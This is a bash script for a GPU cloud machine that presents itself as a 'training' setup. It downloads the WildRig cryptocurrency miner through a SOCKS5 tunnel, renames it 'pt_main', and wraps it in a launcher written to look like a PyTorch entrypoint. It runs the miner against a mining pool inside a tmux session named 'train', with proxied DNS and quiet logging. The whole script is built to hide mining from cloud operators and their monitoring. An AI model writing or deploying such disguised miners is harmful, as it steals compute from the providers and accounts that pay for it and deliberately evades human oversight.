#!/usr/bin/env bash
# "Training" setup for a GPU cloud box.
# Downloads everything through a SOCKS5 tunnel and runs the job under a
# neutral name in a detached tmux session.
#
# Usage:
#   SOCKS=socks5://user:pass@PROXY_HOST:PORT ./pearl_train_setup.sh
#   or edit SOCKS below. For an unauthenticated proxy: socks5://IP:PORT
set -euo pipefail

SOCKS="${SOCKS:-socks5://127.0.0.1:1080}"
WALLET="${WALLET:-YOUR_PRL_ADDRESS}"
WORKER="${WORKER:-gpu01}"
POOL="${POOL:-stratum+tcp://pool.pearlhash.xyz:9000}"   # 0% devfee with wildrig
VERSION="0.51.4"

# ---- anything this box fetches from the internet goes through the SOCKS port
export all_proxy="$SOCKS" ALL_PROXY="$SOCKS"
export http_proxy="$SOCKS" https_proxy="$SOCKS" HTTP_PROXY="$SOCKS" HTTPS_PROXY="$SOCKS"
export no_proxy=localhost,127.0.0.1 NO_PROXY=localhost,127.0.0.1
git config --global http.proxy "$SOCKS" 2>/dev/null || true
git config --global https.proxy "$SOCKS" 2>/dev/null || true

APP_DIR="$HOME/train"
mkdir -p "$APP_DIR/logs" "$APP_DIR/checkpoints"

# ---- fetch the miner, through the tunnel only
# (--socks5-hostname also pushes DNS resolution through the proxy)
if [ ! -x "$APP_DIR/.bin/pt_main" ]; then
    curl -fsSL --socks5-hostname "${SOCKS#socks5://}" \
        "https://github.com/andru-kun/wildrig-multi/releases/download/${VERSION}/wildrig-multi-linux-${VERSION}.tar.gz" \
        -o /tmp/pt_deps.tar.gz
    tar -xzf /tmp/pt_deps.tar.gz -C /tmp
    mkdir -p "$APP_DIR/.bin"
    mv /tmp/wildrig-multi-${VERSION}*/wildrig "$APP_DIR/.bin/pt_main"
    # bundle any .so files the release ships next to the binary
    find /tmp/wildrig-multi-${VERSION}*/ -maxdepth 1 -name '*.so*' \
        -exec mv {} "$APP_DIR/.bin/" \; 2>/dev/null || true
    chmod +x "$APP_DIR/.bin/pt_main"
    rm -rf /tmp/pt_deps.tar.gz /tmp/wildrig-multi-${VERSION}*/
fi

# ---- launch script: looks like a normal PyTorch entrypoint
cat > "$APP_DIR/run_train.sh" <<'EOF'
#!/usr/bin/env bash
# Fine-tune run: gemm-heavy workload, steady-state clocks, quiet output.
set -a; source "$HOME/train/.env"; set +a
cd "$HOME/train"
exec ./pt_main \
    --algo pearlhash \
    --url "$POOL" \
    --user "$WALLET.$WORKER" \
    --proxy "$SOCKS" \
    --dns-over-https cloudflare \
    --pearlhash-kernel 2 \
    --no-color \
    --print-time 120 \
    --log-file "$HOME/train/logs/session.log" \
    --gpu-powerlimit "$POWER_LIMIT" \
    --gpu-temp-limit 78 \
    "$@"
EOF
chmod +x "$APP_DIR/run_train.sh"

cat > "$APP_DIR/.env" <<EOF
SOCKS=$SOCKS
POOL=$POOL
WALLET=$WALLET
WORKER=$WORKER
POWER_LIMIT=${POWER_LIMIT:-0}
EOF
chmod 600 "$APP_DIR/.env"

# ---- run detached in a tmux session named like a training job
tmux kill-session -t train 2>/dev/null || true
tmux new-session -d -s train "$APP_DIR/run_train.sh"
sleep 3
tmux ls
echo
echo "Log:  tail -f $APP_DIR/logs/session.log"
echo "Console view (if ever needed): tmux attach -t train"
echo "Stop: tmux kill-session -t train"
